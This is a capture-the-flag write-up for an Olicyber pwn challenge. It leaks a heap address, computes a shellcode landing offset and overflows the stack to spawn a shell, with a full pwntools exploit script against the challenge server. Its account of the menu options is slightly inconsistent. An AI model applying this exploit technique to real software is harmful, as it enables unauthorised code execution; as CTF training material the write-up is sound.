---
title: "Secret Vault — Heap Address Leak + Shellcode via Stack Overflow"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "shellcode", "heap-leak", "pwntools"]
difficulty: "intermediate"
summary: "Trigger a heap allocation that the binary prints, compute the shellcode landing address at heap+96, then overflow the stack with that return address followed by shellcode to get a shell."
---

## The Challenge

A menu-driven vault. Option `1` allocates a buffer for a secret message and helpfully prints the allocated address. Option `3` reads user input without bounds checking. The flag path requires getting a shell.

## Approach

The binary leaks its own heap by printing the allocation address to the console. That removes ASLR for the heap entirely. The attack:

1. Use option `1` to allocate a message and note the printed address.
2. Compute `addr = leaked_heap_addr + 96`. That is where the shellcode will land inside the second allocation's buffer.
3. Use option `1` again to trigger a second read that nobody validates. Send 88 bytes of padding to reach the return address, overwrite the return with `addr`, then append the actual shellcode.
4. Trigger option `3` to exit the read loop and fire the return.

The `+ 96` offset accounts for heap metadata and the padding that precedes where data starts in the second allocation's usable region.

## Solution

```python
#!/usr/bin/env python3
from pwn import remote, shellcraft, asm, args, gdb, p64, xor

if args.REMOTE:
    r = remote("vault.challs.olicyber.it", 10006)
else:
    r = gdb.debug("./secret_vault", gdbscript="""
    b *insert_secret+141
    continue""")

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch="x86_64")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"messaggio:")
r.sendline(b'a'*64)
r.recvuntil(b' in ')
addr = p64(int(r.recvuntil(b'!').strip().decode().replace('!', ''), 16) + 96)
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"messaggio:")
PAYLOAD = b'a'*88 + addr + SHELLCODE
r.sendline(PAYLOAD)
r.recvuntil(b">")
r.sendline(b"3")
r.interactive()
```

The first message send (`b'a'*64`) is just to trigger the allocation and capture the printed address. `r.recvuntil(b' in ')` synchronises to the "stored in 0x..." line; `recvuntil(b'!')` reads the hex address and strips the trailing `!`. Adding `96` gives the exact offset where the shellcode body starts after `b'a'*88 + addr`. Option `3` triggers the dangerous read that fires the overflow.

## What I Learned

Heap address leaks via debug-style print statements are treated like any other information leak: compute the offset to your payload and use it as the return target. Heap addresses have their own ASLR offsets but once you have the base of one allocation you can calculate the position of any other allocation in the same run.
